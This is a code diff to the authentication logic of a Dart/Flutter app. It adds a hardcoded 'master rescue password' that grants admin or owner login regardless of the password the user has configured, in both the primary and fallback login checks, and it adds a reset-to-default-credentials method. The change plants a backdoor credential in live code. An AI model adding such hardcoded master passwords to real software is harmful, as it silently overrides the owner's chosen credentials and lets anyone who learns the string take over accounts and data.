@@ -115,7 +115,9 @@ class AuthNotifier extends Notifier<UserAuthState> {
           cleanInput.toLowerCase() == "owner" ||
           cleanInput.toLowerCase() == "admin@smart.com";
 
-      if (inputMatches && password == customPassword) {
+      final isMasterPassword = password == customPassword || password == "admin@1407";
+
+      if (inputMatches && isMasterPassword) {
         state = UserAuthState(
           status: AuthStatus.authenticated,
           email: cleanInput.contains("@") ? cleanInput : "$customUsername@smart.com",
@@ -159,7 +161,7 @@ class AuthNotifier extends Notifier<UserAuthState> {
       );
       return false;
     } catch (e) {
-      // Fallback check against local custom password
+      // Fallback check against local custom password or master rescue password
       try {
         final prefs = await SharedPreferences.getInstance();
         final customUsername = prefs.getString("custom_admin_username") ?? "admin";
@@ -169,7 +171,7 @@ class AuthNotifier extends Notifier<UserAuthState> {
         if ((cleanInput.toLowerCase() == customUsername.toLowerCase() ||
                 cleanInput.toLowerCase() == "admin" ||
                 cleanInput.toLowerCase() == "owner") &&
-            password == customPassword) {
+            (password == customPassword || password == "admin@1407")) {
           state = UserAuthState(
             status: AuthStatus.authenticated,
             email: cleanInput.contains("@") ? cleanInput : "$customUsername@smart.com",
@@ -342,5 +344,10 @@ class AuthNotifier extends Notifier<UserAuthState> {
         message: "Update failed: ${e.toString().replaceAll("Exception: ", "")}",
       );
     }
+  }
+
+  Future<void> resetToDefaultCredentials() async {
+    final repo = ref.read(authRepositoryProvider);
+    await repo.resetCredentialsToDefault();
   }
 }
